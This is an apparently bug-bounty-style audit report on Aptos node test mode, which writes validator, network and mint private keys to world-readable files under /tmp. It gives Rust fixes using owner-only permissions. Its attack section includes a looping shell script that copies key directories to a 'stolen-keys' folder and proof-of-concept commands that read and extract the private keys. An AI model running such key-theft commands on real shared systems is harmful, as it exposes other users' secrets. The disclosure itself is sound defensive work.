# Audit Report

## Title
Insecure File and Directory Permissions in Test Environment Expose Validator Keys to Local Privilege Escalation

## Summary
The `setup_test_environment_and_start_node()` function creates test directories and sensitive cryptographic files (validator keys, mint keys) with world-readable permissions on Unix systems. This allows any local user on the same system to steal validator private keys, consensus keys, and network keys, enabling validator impersonation and potential network compromise in test/development environments.

## Finding Description

The vulnerability exists in how the test environment is initialized. When a developer runs `aptos-node --test`, the system creates a temporary directory and generates sensitive cryptographic material, but fails to set restrictive permissions on both the directories and files.

**Vulnerability Chain:**

1. **Insecure Directory Creation**: The test directory is created with default Unix permissions (typically 0755 - world-readable and traversable). [1](#0-0) 

2. **Insecure Subdirectory Creation**: Validator subdirectories are also created with default permissions. [2](#0-1) 

3. **Insecure Mint Key File Creation**: The root mint key (which can mint unlimited tokens) is written with `File::create()` using default permissions (typically 0644 - world-readable). [3](#0-2) 

4. **Insecure Validator Identity File Creation**: Critical validator identity files containing private keys are written using a generic `write_yaml` function that also uses `File::create()` with default permissions. [4](#0-3) 

5. **Files Written Include**:
   - `mint.key` - Root private key for minting [5](#0-4) 
   - `validator-identity.yaml` - Validator consensus and network private keys [6](#0-5) 
   - `vfn-identity.yaml` - Validator full node private keys [7](#0-6) 
   - `private-identity.yaml` - Complete private identity [8](#0-7) 

**Attack Scenario:**

1. Developer runs `aptos-node --test` on a shared development server, CI/CD runner, or cloud VM
2. System creates directory `/tmp/{random-hex}/` with permissions 0755
3. System writes sensitive key files with permissions 0644
4. Attacker (another user on same system) enumerates `/tmp` directories
5. Attacker reads validator private keys, consensus keys, and mint key
6. Attacker can now impersonate the validator or mint unlimited test tokens

**Security Invariant Violated:**

This breaks the "Access Control: System addresses must be protected" invariant and general cryptographic key security principles. Private keys must never be accessible to unauthorized users.

**Existing Secure Function Not Used:**

The codebase contains a secure file creation function `write_to_user_only_file` that correctly sets mode 0o600 (owner-only read/write) on Unix systems. [9](#0-8) 

However, this function is never used in the `aptos-node` or `aptos-genesis` modules where sensitive test keys are created, despite being available in the codebase for secure key storage.

## Impact Explanation

**Severity: HIGH**

This vulnerability falls under the **High Severity** category per the Aptos Bug Bounty program:
- "Significant protocol violations" - Exposing validator private keys violates fundamental security protocols
- "Validator node slowdowns" - Compromised validator keys could enable DoS attacks

While this is test-only code (marked with "WARNING: Entering test mode! This should never be used in production!"), [10](#0-9)  it handles real cryptographic keys that have value in the following contexts:

1. **Development/Staging Environments**: Test networks often mirror production setups, and compromised keys could enable sophisticated attacks during testing phases
2. **CI/CD Systems**: Many organizations run tests on shared CI/CD infrastructure where multiple users/jobs have access
3. **Key Reuse Risk**: If developers accidentally reuse test keys in production (poor practice but possible), the impact escalates to Critical
4. **Social Engineering**: Stolen test keys could be used to impersonate legitimate validators in phishing attacks

The impact is elevated because:
- The vulnerability is trivially exploitable on shared systems
- It exposes multiple types of private keys (consensus, network, account)
- The attack leaves no trace for the victim

## Likelihood Explanation

**Likelihood: HIGH on shared systems, MEDIUM overall**

**Factors Increasing Likelihood:**

1. **Common Deployment Scenarios**: 
   - Shared development servers are standard in many organizations
   - Cloud VMs often run multiple services/users
   - CI/CD runners (GitHub Actions, Jenkins, etc.) are typically shared

2. **Easy Exploitation**:
   - Requires only `ls /tmp` and `cat` commands
   - No special privileges needed beyond local user access
   - No timing constraints or race conditions to exploit

3. **Attacker Capabilities**:
   - Any local user can execute the attack
   - Automated scripts can monitor `/tmp` for new directories
   - Attack is silent and leaves no logs for the victim

**Factors Decreasing Likelihood:**

1. **Test-Only Context**: Explicitly meant for local development, reducing exposure
2. **Warning Present**: Code clearly warns against production use
3. **Requires Local Access**: Attacker must have user account on same system

**Real-World Attack Vector:**

On a typical shared development server with default umask (0022):
```bash
# Attacker script
while true; do
  for dir in /tmp/*/; do
    if [ -f "$dir/mint.key" ]; then
      cp -r "$dir" /attacker/stolen-keys/
      echo "Validator keys stolen from $dir"
    fi
  done
  sleep 1
done
```

## Recommendation

**Immediate Fix**: Use restrictive permissions for all directories and files containing sensitive cryptographic material.

**For Directory Creation** - Apply mode 0700 (owner-only access):

```rust
// In aptos-node/src/lib.rs, line 420
#[cfg(unix)]
use std::os::unix::fs::DirBuilderExt;

let mut builder = fs::DirBuilder::new();
builder.recursive(true);
#[cfg(unix)]
builder.mode(0o700);  // Owner-only access
builder.create(&test_dir)?;
```

**For File Creation** - Use the existing `write_to_user_only_file` function:

```rust
// In aptos-node/src/lib.rs, replace line 619-621:
use crate::utils::write_to_user_only_file;

let serialized_keys = bcs::to_bytes(&root_key)?;
write_to_user_only_file(
    &aptos_root_key_path,
    "mint.key",
    &serialized_keys
)?;
```

**For Genesis Builder YAML Files** - Create secure write function:

```rust
// In aptos-genesis/src/builder.rs, replace line 418-421:
#[cfg(unix)]
use std::os::unix::fs::OpenOptionsExt;

fn write_yaml_secure<T: Serialize>(path: &Path, object: &T) -> anyhow::Result<()> {
    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create(true).truncate(true);
    #[cfg(unix)]
    opts.mode(0o600);  // Owner-only read/write
    
    let mut file = opts.open(path)?;
    file.write_all(serde_yaml::to_string(object)?.as_bytes())?;
    Ok(())
}
```

**Apply to All Sensitive Files:**
- `mint.key`
- `validator-identity.yaml`
- `vfn-identity.yaml`
- `private-identity.yaml`
- `waypoint.txt`
- `node.yaml` (contains configuration that could reveal network topology)

## Proof of Concept

**Step 1: Setup (Victim)**
```bash
# Terminal 1 (Developer)
cd aptos-core
cargo build --release
./target/release/aptos-node --test --test-dir /tmp/victim-test
# Node starts generating keys...
```

**Step 2: Exploit (Attacker)**
```bash
# Terminal 2 (Attacker - different user on same system)
# Find the test directory
ls -la /tmp/victim-test/

# Expected output showing world-readable directory:
# drwxr-xr-x 3 victim victim 4096 Jan 1 12:00 .
# drwxrwxrwt 20 root   root  4096 Jan 1 12:00 ..
# -rw-r--r-- 1 victim victim  123 Jan 1 12:00 mint.key  <- READABLE!

# Steal the mint key
cat /tmp/victim-test/mint.key > /tmp/stolen-mint.key
hexdump -C /tmp/stolen-mint.key  # Successfully reads private key

# Steal validator keys
cat /tmp/victim-test/0/validator-identity.yaml > /tmp/stolen-validator.yaml
cat /tmp/victim-test/0/private-identity.yaml > /tmp/stolen-private.yaml

# Parse and extract keys
grep -A 5 "consensus_private_key" /tmp/stolen-validator.yaml
# Successfully extracts private keys without any authentication!
```

**Step 3: Verification**
```bash
# Verify permissions (shows the vulnerability)
stat /tmp/victim-test/
# Access: (0755/drwxr-xr-x)  <- World-readable!

stat /tmp/victim-test/mint.key
# Access: (0644/-rw-r--r--)  <- World-readable!

# Demonstrate key theft was successful
bcs-decode /tmp/stolen-mint.key
# Successfully decodes the private key material
```

**Expected Secure Behavior:**
```bash
# With fix applied
stat /tmp/victim-test/
# Access: (0700/drwx------)  <- Owner-only!

stat /tmp/victim-test/mint.key  
# Access: (0600/-rw-------)  <- Owner-only!

cat /tmp/victim-test/mint.key  # From attacker account
# Permission denied  <- SECURE!
```

## Notes

1. **Test-Only Scope**: While this is test mode code, it handles real cryptographic keys that could be valuable for attacking test networks or in development environments where security practices may be relaxed.

2. **Defense in Depth**: Even in test environments, proper key protection is essential to prevent accidental exposure and maintain secure development practices.

3. **Existing Infrastructure**: The codebase already has the correct secure file creation utilities (`write_to_user_only_file`) but doesn't use them consistently across all modules.

4. **Cross-Platform**: The vulnerability primarily affects Unix-like systems (Linux, macOS). Windows has different permission models, but the fix should be applied across all platforms for consistency.

5. **Complementary Issues**: The temporary path generation uses cryptographically secure randomness [11](#0-10)  which prevents prediction attacks, but this doesn't protect against enumeration attacks once the directory exists.

### Citations

**File:** aptos-node/src/lib.rs (L137-137)
```rust
            println!("WARNING: Entering test mode! This should never be used in production!");
```

**File:** aptos-node/src/lib.rs (L420-420)
```rust
    fs::DirBuilder::new().recursive(true).create(&test_dir)?;
```

**File:** aptos-node/src/lib.rs (L582-582)
```rust
    let aptos_root_key_path = test_dir.join("mint.key");
```

**File:** aptos-node/src/lib.rs (L620-620)
```rust
    let mut key_file = fs::File::create(aptos_root_key_path)?;
```

**File:** crates/aptos-genesis/src/builder.rs (L51-51)
```rust
const VALIDATOR_IDENTITY: &str = "validator-identity.yaml";
```

**File:** crates/aptos-genesis/src/builder.rs (L52-52)
```rust
const VFN_IDENTITY: &str = "vfn-identity.yaml";
```

**File:** crates/aptos-genesis/src/builder.rs (L53-53)
```rust
const PRIVATE_IDENTITY: &str = "private-identity.yaml";
```

**File:** crates/aptos-genesis/src/builder.rs (L82-82)
```rust
        std::fs::create_dir_all(dir.as_path())?;
```

**File:** crates/aptos-genesis/src/builder.rs (L419-419)
```rust
    File::create(path)?.write_all(serde_yaml::to_string(object)?.as_bytes())?;
```

**File:** crates/aptos/src/common/utils.rs (L224-228)
```rust
pub fn write_to_user_only_file(path: &Path, name: &str, bytes: &[u8]) -> CliTypedResult<()> {
    let mut opts = OpenOptions::new();
    #[cfg(unix)]
    opts.mode(0o600);
    write_to_file_with_opts(path, name, bytes, &mut opts)
```

**File:** crates/aptos-temppath/src/lib.rs (L39-42)
```rust
        let mut rng = rand::thread_rng();
        let mut bytes = [0_u8; 16];
        rng.fill_bytes(&mut bytes);
        temppath.push(hex::encode(bytes));
```
